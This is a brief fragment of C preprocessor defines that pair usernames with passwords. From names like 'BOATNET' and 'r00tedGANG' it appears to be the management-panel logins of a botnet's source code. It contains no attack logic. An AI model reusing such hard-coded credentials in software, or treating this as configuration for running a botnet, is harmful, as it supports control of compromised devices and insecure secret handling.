...
#define MY_MGM_PROXYP "BOATNET"
#define MY_MGM_PROXYU "TRAGEDY"
#define MY_MGM_LORDP "%%r00tedGANG%%"
#define MY_MGM_LORDU "SHA"
#define MY_MGM_CHERRYSP "%%r00tedMUS%%"
#define MY_MGM_CHERRYSU "MUS"
#define MY_MGM_SUDOCP "P4SS123"
#define MY_MGM_SUDOCU "PACKETS"
